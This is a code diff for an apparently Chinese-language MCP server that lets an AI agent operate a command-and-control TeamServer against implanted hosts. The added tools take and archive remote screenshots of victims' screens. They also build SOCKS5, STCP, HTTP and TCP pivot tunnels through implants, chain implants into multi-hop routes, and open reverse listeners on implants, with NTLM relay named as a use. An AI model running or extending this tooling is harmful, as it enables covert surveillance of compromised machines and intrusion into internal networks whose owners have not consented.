@@ -83,6 +83,24 @@ async def _resolve_uid(api: EasyShellAPI, uid: str) -> str:
     return uid
 
 
+async def _fetch_tunnel_route(api: EasyShellAPI, uid: str) -> dict:
+    """查询出口 UID 的多级 HOP 路由链（ParentUid 或显式 RouteChain）。"""
+    resp = await api.get("socks5/route", params={"uid": uid})
+    if not _ok(resp):
+        return {}
+    data = resp.get("data") or {}
+    return data if isinstance(data, dict) else {}
+
+
+def _format_route_hint(route_data: dict) -> str:
+    chain = str(route_data.get("routeChain") or "").strip()
+    hops = int(route_data.get("hopCount") or 0)
+    if not chain:
+        return "路由: 单跳"
+    suffix = f" ({hops} 跳)" if hops > 1 else ""
+    return f"路由: {chain}{suffix}"
+
+
 def _format_upload_job(u: dict) -> str:
     name = str(u.get("fileName") or u.get("FileName") or "?")[:24]
     part = u.get("uploadPart", u.get("UploadPart", 0))
@@ -128,6 +146,63 @@ def _truncate(text: str, limit: int = 12000) -> str:
     if len(text) <= limit:
         return text
     return text[:limit] + f"\n...(截断，共 {len(text)} 字符)"
+
+
+# ============================================================
+# 截屏帮助函数（图片落本地 → 对话内可直接展示）
+# ============================================================
+
+def _screenshot_base_dir() -> Path:
+    """截图默认保存目录：env EASYSHELL_SCREENSHOT_DIR 优先，否则 MCP 工作目录下 easyshell_screenshots。"""
+    env_dir = os.environ.get("EASYSHELL_SCREENSHOT_DIR", "").strip()
+    base = Path(env_dir) if env_dir else (Path.cwd() / "easyshell_screenshots")
+    base.mkdir(parents=True, exist_ok=True)
+    return base
+
+
+def _sniff_image_ext(data: bytes) -> str:
+    """按文件头判断扩展名（PNG/JPEG），兜底 .png。"""
+    if data[:3] == b"\xff\xd8\xff":
+        return ".jpg"
+    if data[:8] == b"\x89PNG\r\n\x1a\n":
+        return ".png"
+    return ".png"
+
+
+def _safe_uid_part(uid: str, length: int = 12) -> str:
+    return re.sub(r"[^0-9a-zA-Z]", "", uid)[:length] or "client"
+
+
+def _save_screenshot(data: bytes, *, uid: str, tag: str = "screen") -> Path:
+    """按 uid+时间戳写入默认截图目录，返回绝对路径。"""
+    name = f"{tag}_{_safe_uid_part(uid)}_{time.strftime('%Y%m%d_%H%M%S')}{_sniff_image_ext(data)}"
+    p = _screenshot_base_dir() / name
+    p.write_bytes(data)
+    return p
+
+
+def _http_err_text(e: Exception) -> str:
+    """从 httpx.HTTPStatusError 中提取服务端 error/message 文案。"""
+    resp = getattr(e, "response", None)
+    if resp is not None:
+        try:
+            d = resp.json()
+            if isinstance(d, dict):
+                for key in ("error", "message", "msg"):
+                    val = d.get(key)
+                    if val:
+                        return str(val)
+        except Exception:
+            pass
+        return f"HTTP {resp.status_code}"
+    return str(e)
+
+
+def _fmt_history_ts(ms) -> str:
+    try:
+        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(ms) / 1000))
+    except Exception:
+        return str(ms)
 
 
 # ============================================================
@@ -384,6 +459,7 @@ async def easyshell_start_socks5(
     username: str = "",
     password: str = "",
     force: bool = True,
+    group_key: str = "",
 ) -> str:
     """为植入体创建 SOCKS5 隧道（端口开在 TeamServer 上，流量从植入体出口）。
 
@@ -393,9 +469,10 @@ async def easyshell_start_socks5(
         username: SOCKS5 用户名（可空）
         password: SOCKS5 密码（可空）
         force: True 时若同 uid 已有隧道则先关闭再建
+        group_key: 负载组键；同端口多 implant 填相同值可轮询分担（参考 frp group）
     """
     api = _get_api()
-    uid = uid.strip()
+    uid = await _resolve_uid(api, uid.strip())
 
     if force:
         lst = await api.get("socks5/list", params={"uid": uid, "page": 1, "page_size": 50})
@@ -423,15 +500,107 @@ async def easyshell_start_socks5(
         "UserName": username,
         "Password": password,
         "Type": "socks5",
+        "GroupKey": group_key.strip(),
     })
     if not _ok(resp):
         return f"建隧道失败: {_err(resp)}"
 
-    _tunnels[str(port)] = {"uid": uid, "port": port, "created_at": time.time()}
+    route_hint = _format_route_hint(await _fetch_tunnel_route(api, uid))
+    _tunnels[str(port)] = {"uid": uid, "port": port, "created_at": time.time(), "group_key": group_key.strip()}
     auth = ""
     if username:
         auth = f" --proxy-user {username}:{password}"
-    return f"SOCKS5 就绪: curl --socks5 127.0.0.1:{port}{auth} http://目标/"
+    gk = f" group={group_key}" if group_key.strip() else ""
+    return f"SOCKS5 就绪: curl --socks5 127.0.0.1:{port}{auth} http://目标/{gk}\n{route_hint}"
+
+
+@mcp.tool()
+async def easyshell_start_stcp_tunnel(
+    uid: str,
+    local_port: int,
+    target_addr: str,
+    secret_key: str,
+    force: bool = True,
+) -> str:
+    """创建 STCP 密钥隧道（TeamServer visitor 端口 + 植入体侧 tcp 转发，植入体无额外协议）。
+
+    Visitor 连接方式：向 TeamServer:port 发送 32 字节 SHA256(secret_key)，随后为到目标的 TCP 流。
+
+    Args:
+        uid: 植入体 UID
+        local_port: TeamServer visitor 端口，0=自动
+        target_addr: 植入体可达的内网目标 host:port
+        secret_key: STCP 密钥（至少 8 位）
+        force: 同 uid 已有隧道时先关闭
+    """
+    api = _get_api()
+    uid = uid.strip()
+    if force:
+        lst = await api.get("socks5/list", params={"uid": uid, "page": 1, "page_size": 50})
+        if _ok(lst):
+            for t in (lst.get("data") or {}).get("list") or []:
+                p = str(t.get("Socks5port", ""))
+                u = t.get("UserName") or ""
+                pw = t.get("Password") or ""
+                await api.post("socks5/close", json_body={"uid": uid, "Socks5port": p, "UserName": u, "Password": pw})
+                await api.post("socks5/delete", json_body={"uid": uid, "Socks5port": p, "UserName": u, "Password": pw})
+    if local_port <= 0:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("127.0.0.1", 0))
+        local_port = s.getsockname()[1]
+        s.close()
+    resp = await api.post("socks5/start", json_body={
+        "uid": uid,
+        "Socks5port": str(local_port),
+        "UserName": "",
+        "Password": "",
+        "Type": "forward",
+        "TargetAddr": target_addr.strip(),
+        "Sk": secret_key.strip(),
+    })
+    if _ok(resp):
+        return f"STCP 就绪: visitor 连 TeamServer:{local_port}，首包 SHA256(sk) 32B，转发→ {target_addr}"
+    return f"失败: {_err(resp)}"
+
+
+@mcp.tool()
+async def easyshell_start_http_tunnel(
+    uid: str,
+    local_port: int,
+    target_addr: str = "",
+    username: str = "",
+    password: str = "",
+) -> str:
+    """创建 HTTP 隧道（仅 TeamServer 解析 HTTP；植入体仍走既有 tcp/socks5 转发）。
+
+    Args:
+        uid: 植入体 UID
+        local_port: TeamServer 端口，0=自动
+        target_addr: 反向模式填内网 Web host:port；留空=HTTP CONNECT 正向代理
+        username: CONNECT/SOCKS 认证（可空）
+        password: 密码（可空）
+    """
+    api = _get_api()
+    if local_port <= 0:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("127.0.0.1", 0))
+        local_port = s.getsockname()[1]
+        s.close()
+    body = {
+        "uid": uid.strip(),
+        "Socks5port": str(local_port),
+        "UserName": username,
+        "Password": password,
+        "Type": "http",
+        "TargetAddr": target_addr.strip(),
+    }
+    resp = await api.post("socks5/start", json_body=body)
+    if _ok(resp):
+        if target_addr.strip():
+            return f"HTTP 反向代理: TeamServer:{local_port} → {target_addr}（经植入体）"
+        auth = f" user={username}" if username else ""
+        return f"HTTP CONNECT 代理: 配置 HTTP 代理 127.0.0.1:{local_port}{auth}"
+    return f"失败: {_err(resp)}"
 
 
 @mcp.tool()
@@ -696,6 +865,211 @@ async def easyshell_delete_file(uid: str, path: str) -> str:
 
 
 # ============================================================
+# 屏幕截屏（REST 单次截屏 + 归档历史 → 本地图片，对话内展示）
+#
+# Web 端实时键鼠 / 录屏走 WebSocket（ws/screen），MCP 无法轮询；
+# 但单次截屏 GET /client/screen/capture 是同步 REST，可完整复用，
+# 截取结果保存为本地 PNG/JPG 后即可在对话中直接打开查看。
+# ============================================================
+
+@mcp.tool()
+async def easyshell_screen_capture(
+    uid: str,
+    save_path: str = "",
+    quality: int = 78,
+    max_edge: int = 1440,
+    archive: bool = True,
+    timeout: int = 320,
+) -> str:
+    """远程截取植入体屏幕并保存为本地图片（对话中可直接展示）。
+
+    同步等待植入体回包（慢 Beacon 可能耗时较长，服务器上限 300s）。
+    成功后：1) 图片写入本机 easyshell_screenshots/（或 save_path）；
+    2) archive=True（默认）同步归档到 TeamServer 截屏历史。
+
+    Args:
+        uid: 植入体 UID（支持唯一前缀）
+        save_path: 本机保存路径（可空；默认 easyshell_screenshots/ 下 uid_时间戳.png|jpg）
+        quality: JPEG 质量 1–100
+        max_edge: 最长边像素 320–8192（越大越清晰、传输越慢）
+        archive: 是否写入 TeamServer 截屏历史（与 Web「截屏」按钮一致）
+        timeout: 最长等待秒数
+    """
+    api = _get_api()
+    try:
+        uid = await _resolve_uid(api, uid.strip())
+    except ValueError as e:
+        return str(e)
+    params = {"uid": uid}
+    if quality:
+        params["quality"] = int(quality)
+    if max_edge:
+        params["maxEdge"] = int(max_edge)
+    try:
+        resp = await api.get(
+            "client/screen/capture",
+            params=params,
+            timeout=min(max(int(timeout), 30), 320),
+        )
+    except Exception as e:
+        return f"截屏失败: {_http_err_text(e)}（离线/无桌面会话/慢 Beacon 时查看 Shell 中 !Error，可加大 timeout）"
+    if not _ok(resp):
+        return f"截屏失败: {_err(resp)}"
+    data = resp.get("data") or {}
+    b64 = str(data.get("imageBase64") or "").strip()
+    if not b64 or b64.startswith("{") or b64.startswith("["):
+        return "截屏失败: 服务端未返回有效图像（常见 Windows 宿主无桌面会话 / GDI 截屏失败，见 Shell 中 !Error）"
+    try:
+        raw = base64.b64decode(b64)
+    except Exception as e:
+        return f"截屏失败: 图像 Base64 解码错误: {e}"
+    if not raw:
+        return "截屏失败: 图像数据为空"
+    try:
+        if save_path.strip():
+            p = Path(save_path.strip())
+            p.parent.mkdir(parents=True, exist_ok=True)
+            p.write_bytes(raw)
+        else:
+            p = _save_screenshot(raw, uid=uid)
+    except Exception as e:
+        return f"截屏已取回但本地保存失败: {e}"
+
+    try:
+        sw = int(data.get("screenW") or 0)
+        sh = int(data.get("screenH") or 0)
+    except (TypeError, ValueError):
+        sw = sh = 0
+    mime = str(data.get("mime") or f"image/{_sniff_image_ext(raw).lstrip('.')}")
+    dims = f"{sw}x{sh}" if sw > 0 and sh > 0 else "尺寸未知"
+    lines = [
+        f"截屏成功 uid={uid}（{dims}, {mime}, {len(raw)} bytes）",
+        f"  本机图片: {p}",
+        "  对话展示: 用图像查看能力打开上面的本地路径，即可在对话中查看并分析截图",
+    ]
+    if archive:
+        try:
+            hist = await api.post("client/screen/history", json_body={
+                "uid": uid,
+                "imageBase64": b64,
+                "mime": mime,
+                "screenW": sw,
+                "screenH": sh,
+                "source": "live",
+            })
+            if _ok(hist):
+                hid = (hist.get("data") or {}).get("id") or "?"
+                lines.append(f"  已归档: 历史 id={hid}（easyshell_screen_history / screen_history_get 可回看）")
+            else:
+                lines.append(f"  归档失败（不影响本地图片）: {_err(hist)}")
+        except Exception as e:
+            lines.append(f"  归档失败（不影响本地图片）: {_http_err_text(e)}")
+    return "\n".join(lines)
+
+
+@mcp.tool()
+async def easyshell_screen_history(uid: str, page_size: int = 20) -> str:
+    """列出 TeamServer 上某植入体的截屏归档（最新在前）。
+
+    Args:
+        uid: 植入体 UID（支持唯一前缀）
+        page_size: 1–100
+    """
+    api = _get_api()
+    try:
+        uid = await _resolve_uid(api, uid.strip())
+    except ValueError as e:
+        return str(e)
+    try:
+        resp = await api.get(
+            "client/screen/history",
+            params={"uid": uid, "page": 1, "page_size": max(1, min(int(page_size), 100))},
+        )
+    except Exception as e:
+        return f"查询失败: {_http_err_text(e)}"
+    if not _ok(resp):
+        return f"查询失败: {_err(resp)}"
+    data = resp.get("data") or {}
+    items = data.get("list") or []
+    if not items:
+        return f"uid={uid} 暂无截屏归档（先 easyshell_screen_capture 截一张，archive=True 自动入历史）"
+    lines = ["id | 截屏时间 | 尺寸 | 大小 | 来源 | MIME", "-" * 76]
+    for it in items:
+        w, h = it.get("screenW") or 0, it.get("screenH") or 0
+        dims = f"{w}x{h}" if w and h else "-"
+        size = it.get("fileSize") or 0
+        src = "live" if it.get("source") == "live" else "manual"
+        lines.append(
+            "  %-5s | %s | %-9s | %-8s | %-6s | %s"
+            % (
+                it.get("id", "?"),
+                _fmt_history_ts(it.get("createdAt")),
+                dims,
+                size,
+                src,
+                it.get("mime", "?"),
+            )
+        )
+    lines.append(f"共 {len(items)} 条；用 easyshell_screen_history_get(id) 下载到本机展示")
+    return "\n".join(lines)
+
+
+@mcp.tool()
+async def easyshell_screen_history_get(result_id: int, save_path: str = "") -> str:
+    """把 TeamServer 截屏归档中的一张图下载到本机（对话中可直接展示）。
+
+    Args:
+        result_id: easyshell_screen_history 返回的 id
+        save_path: 本机保存路径（可空；默认 easyshell_screenshots/ 下 history_<id>_<时间戳>.png|jpg）
+    """
+    api = _get_api()
+    try:
+        raw = await api.download_binary(
+            "client/screen/history/file",
+            params={"id": int(result_id), "inline": "1"},
+            plain_query=True,
+            timeout=60,
+        )
+    except Exception as e:
+        return f"下载失败: {_http_err_text(e)}（id 需来自 easyshell_screen_history 输出）"
+    if not raw:
+        return f"下载失败: id={result_id} 为空或不存在"
+    try:
+        if save_path.strip():
+            p = Path(save_path.strip())
+            p.parent.mkdir(parents=True, exist_ok=True)
+            p.write_bytes(raw)
+        else:
+            p = _screenshot_base_dir() / (
+                f"history_{int(result_id)}_{time.strftime('%Y%m%d_%H%M%S')}{_sniff_image_ext(raw)}"
+            )
+            p.write_bytes(raw)
+    except Exception as e:
+        return f"图片已取回但本地保存失败: {e}"
+    return (
+        f"已下载截屏记录 id={result_id} → {p}（{len(raw)} bytes）\n"
+        "  对话展示: 用图像查看能力打开上面的本地路径即可查看截图"
+    )
+
+
+@mcp.tool()
+async def easyshell_screen_history_delete(result_id: int) -> str:
+    """删除 TeamServer 截屏历史中的一条归档（库记录 + 磁盘文件）。
+
+    Args:
+        result_id: easyshell_screen_history 返回的 id
+    """
+    api = _get_api()
+    try:
+        resp = await api.request("DELETE", "client/screen/history", json_body={"id": int(result_id)})
+    except Exception as e:
+        return f"删除失败: {_http_err_text(e)}"
+    if isinstance(resp, dict) and not resp.get("error") and resp.get("status") in (200, None):
+        return f"已删除截屏记录 id={result_id}"
+    return f"删除失败: {_err(resp)}"
+
+
+# ============================================================
 # SOCKS5 隧道扩展
 # ============================================================
 
@@ -716,21 +1090,74 @@ async def easyshell_list_tunnels(uid: str = "") -> str:
     items = (resp.get("data") or {}).get("list") or []
     if not items:
         return "没有隧道"
-    lines = ["UID | 端口 | 类型 | 状态 | 备注"]
-    lines.append("-" * 70)
+    lines = ["UID | 端口 | 类型 | 跳数 | Phase | 流量↑/↓ | 备注"]
+    lines.append("-" * 88)
     for t in items:
-        status = "运行" if t.get("Status") == 1 else "停止"
+        phase = str(t.get("Phase") or ("online" if t.get("Status") == 1 else "stopped"))
+        up = int(t.get("StatsBytesUp") or 0)
+        down = int(t.get("StatsBytesDown") or 0)
+        traffic = f"{up}/{down}"
+        chain = str(t.get("RouteChain") or "").strip()
+        hops = len(chain.split(":")) if chain else 1
         lines.append(
-            "  %-10s | %-5s | %-6s | %-4s | %s"
+            "  %-10s | %-5s | %-8s | %-3s | %-8s | %-12s | %s"
             % (
                 str(t.get("Uid", "?"))[:10],
                 str(t.get("Socks5port", "?"))[:5],
-                str(t.get("Type", "socks5"))[:6],
-                status,
-                str(t.get("Remark", ""))[:30],
+                str(t.get("Type", "socks5"))[:8],
+                str(hops),
+                phase[:8],
+                traffic[:12],
+                str(t.get("Remark", ""))[:24],
             )
         )
+        if chain:
+            lines.append(f"    └─ {chain[:72]}{'…' if len(chain) > 72 else ''}")
     return "\n".join(lines)
+
+
+@mcp.tool()
+async def easyshell_tunnel_probe(uid: str, port: int, target: str = "") -> str:
+    """深度探测隧道：监听/植入体在线/本地握手；SOCKS5 可填 target 做 CONNECT 端到端验证。
+
+    Args:
+        uid: 植入体 UID
+        port: 隧道端口
+        target: 可选，SOCKS5 经隧道 CONNECT 的目标 host:port
+    """
+    api = _get_api()
+    body = {"uid": uid.strip(), "Socks5port": str(port), "UserName": "", "Password": ""}
+    lst = await api.get("socks5/list", params={"uid": uid.strip(), "page": 1, "page_size": 50})
+    if _ok(lst):
+        for t in (lst.get("data") or {}).get("list") or []:
+            if str(t.get("Socks5port")) == str(port):
+                body["UserName"] = t.get("UserName") or ""
+                body["Password"] = t.get("Password") or ""
+                break
+    if target.strip():
+        body["Target"] = target.strip()
+    resp = await api.post("socks5/probe", json_body=body)
+    if not _ok(resp):
+        return f"探测失败: {_err(resp)}"
+    data = resp.get("data") or {}
+    if isinstance(data, dict):
+        lines = [str(data.get("message") or "探测完成"), f"Phase: {data.get('Phase', '?')}", "检查项:"]
+        for c in data.get("checks") or []:
+            mark = "OK" if c.get("ok") else "FAIL"
+            lines.append(f"  [{mark}] {c.get('name')}: {c.get('message')}")
+        return "\n".join(lines)
+    return str(data)
+
+
+@mcp.tool()
+async def easyshell_tunnel_reconcile() -> str:
+    """校正异常隧道：将 DB 运行中但本地未监听的条目置为停止。"""
+    api = _get_api()
+    resp = await api.post("socks5/reconcile", json_body={})
+    if _ok(resp):
+        data = resp.get("data") or {}
+        return str(data.get("message") or f"已修正 {data.get('reconciled', 0)} 条")
+    return f"校正失败: {_err(resp)}"
 
 
 @mcp.tool()
@@ -1071,7 +1498,7 @@ async def easyshell_get_client(uid: str) -> str:
         if str(c.get("Uid", "")).strip() == uid_resolved:
             lines = [f"UID: {c.get('Uid')}"]
             for k in ("Computer", "InternalIP", "ExternalIP", "Username", "Listener",
-                       "Online", "Sleep", "Arch", "Group", "Note", "Pid", "Process"):
+                       "Online", "Sleep", "Arch", "Group", "Note", "Pid", "Process", "ParentUid"):
                 if c.get(k) not in (None, ""):
                     lines.append(f"  {k}: {c.get(k)}")
             return "\n".join(lines)
@@ -1702,32 +2129,144 @@ async def easyshell_batch_exec(
 
 
 @mcp.tool()
-async def easyshell_start_tcp_tunnel(uid: str, local_port: int, target_addr: str) -> str:
+async def easyshell_start_tcp_tunnel(uid: str, local_port: int, target_addr: str, group_key: str = "") -> str:
     """创建 TCP 端口转发隧道（TeamServer 本地端口 → 植入体侧目标）。
 
     Args:
         uid: 植入体 UID
         local_port: TeamServer 监听端口，0=自动
         target_addr: 植入体可达的目标 host:port
+        group_key: 负载组键；同端口多 implant 轮询（TCP 组内 target 须一致）
     """
     api = _get_api()
+    uid = await _resolve_uid(api, uid.strip())
     if local_port <= 0:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind(("127.0.0.1", 0))
         local_port = s.getsockname()[1]
         s.close()
     resp = await api.post("socks5/start", json_body={
-        "uid": uid.strip(),
+        "uid": uid,
         "Socks5port": str(local_port),
         "UserName": "",
         "Password": "",
-        "Type": "tcp",
+        "Type": "forward",
         "TargetAddr": target_addr.strip(),
+        "GroupKey": group_key.strip(),
     })
     if _ok(resp):
-        _tunnels[str(local_port)] = {"uid": uid, "port": local_port, "type": "tcp", "target": target_addr}
-        return f"TCP 隧道就绪: 127.0.0.1:{local_port} → {target_addr}（经植入体 {uid}）"
+        route_hint = _format_route_hint(await _fetch_tunnel_route(api, uid))
+        _tunnels[str(local_port)] = {
+            "uid": uid, "port": local_port, "type": "forward", "target": target_addr,
+            "group_key": group_key.strip(),
+        }
+        gk = f" group={group_key}" if group_key.strip() else ""
+        return f"正向转发就绪: 127.0.0.1:{local_port} → {target_addr}（出口 {uid[:10]}…）{gk}\n{route_hint}"
     return f"失败: {_err(resp)}"
+
+
+@mcp.tool()
+async def easyshell_get_tunnel_route(uid: str) -> str:
+    """查询植入体多级 HOP 路由链（沿 ParentUid 推断，格式 uid@ip:uid@ip）。
+
+    Args:
+        uid: 出口植入体 UID（可传前缀，自动解析）
+    """
+    api = _get_api()
+    uid = await _resolve_uid(api, uid.strip())
+    data = await _fetch_tunnel_route(api, uid)
+    if not data:
+        return f"查询失败或 UID 无效: {uid}"
+    chain = str(data.get("routeChain") or "").strip()
+    hops = int(data.get("hopCount") or 0)
+    egress = str(data.get("egressUid") or uid).strip()
+    lines = [f"出口 UID: {egress}", f"跳数: {hops or 1}", f"路由链: {chain or '（单跳，无 ParentUid）'}"]
+    hop_list = data.get("hops") or []
+    if isinstance(hop_list, list) and hop_list:
+        lines.append("逐跳:")
+        for i, h in enumerate(hop_list, 1):
+            if isinstance(h, dict):
+                lines.append(f"  {i}. {h.get('UID', '?')} @ {h.get('IP') or '—'}")
+    return "\n".join(lines)
+
+
+@mcp.tool()
+async def easyshell_set_topology_parent(uid: str, parent_uid: str = "") -> str:
+    """设置植入体上级 ParentUid（Stowaway 式 parent/child，多跳 HOP 拓扑）。
+
+    Args:
+        uid: 当前植入体 UID（可传前缀）
+        parent_uid: 上级植入体 UID；留空清除上级，改回自动推断
+    """
+    api = _get_api()
+    uid = await _resolve_uid(api, uid.strip())
+    parent = parent_uid.strip()
+    if parent:
+        parent = await _resolve_uid(api, parent)
+    if parent == uid:
+        return "不能将自身设为上级"
+    resp = await api.post("client/topology/parent", json_body={"uid": uid, "ParentUid": parent})
+    if not _ok(resp):
+        return f"设置失败: {_err(resp)}"
+    data = resp.get("data") or {}
+    chain = str(data.get("routeChain") or "").strip() if isinstance(data, dict) else ""
+    parent_show = parent or "（已清除，自动推断）"
+    lines = [f"已设置 {uid[:10]}… 的上级 → {parent_show}"]
+    if chain:
+        lines.append(f"推断路由: {chain}")
+    return "\n".join(lines)
+
+
+@mcp.tool()
+async def easyshell_start_backward_tunnel(
+    uid: str,
+    listen_addr: str,
+    local_addr: str,
+    mirror_port: int = 0,
+    force: bool = True,
+) -> str:
+    """创建反向映射隧道（植入体监听 → TeamServer LocalAddr 桥接）。
+
+    适用：目标只能访问植入体 IP 时的 NTLM Relay、回连等场景。
+
+    Args:
+        uid: 出口植入体 UID
+        listen_addr: 植入体侧监听，如 :8080 或 0.0.0.0:445
+        local_addr: TeamServer 桥接目标，如 127.0.0.1:7000
+        mirror_port: TeamServer 可选镜像端口，0=不镜像
+        force: 同 uid 已有隧道时先关闭
+    """
+    api = _get_api()
+    uid = await _resolve_uid(api, uid.strip())
+    if force:
+        lst = await api.get("socks5/list", params={"uid": uid, "page": 1, "page_size": 50})
+        if _ok(lst):
+            for t in (lst.get("data") or {}).get("list") or []:
+                p = str(t.get("Socks5port", ""))
+                u = t.get("UserName") or ""
+                pw = t.get("Password") or ""
+                await api.post("socks5/close", json_body={"uid": uid, "Socks5port": p, "UserName": u, "Password": pw})
+                await api.post("socks5/delete", json_body={"uid": uid, "Socks5port": p, "UserName": u, "Password": pw})
+    body: dict = {
+        "uid": uid,
+        "Socks5port": str(mirror_port) if mirror_port > 0 else "",
+        "UserName": "",
+        "Password": "",
+        "Type": "backward",
+        "TargetAddr": listen_addr.strip(),
+        "LocalAddr": local_addr.strip(),
+    }
+    resp = await api.post("socks5/start", json_body=body)
+    if not _ok(resp):
+        return f"失败: {_err(resp)}"
+    route_hint = _format_route_hint(await _fetch_tunnel_route(api, uid))
+    mirror = f"\n镜像: 127.0.0.1:{mirror_port}" if mirror_port > 0 else ""
+    return (
+        f"反向映射就绪:\n"
+        f"  植入体监听: {listen_addr}\n"
+        f"  TeamServer 桥接: {local_addr}{mirror}\n"
+        f"{route_hint}"
+    )
 
 
 if __name__ == "__main__":
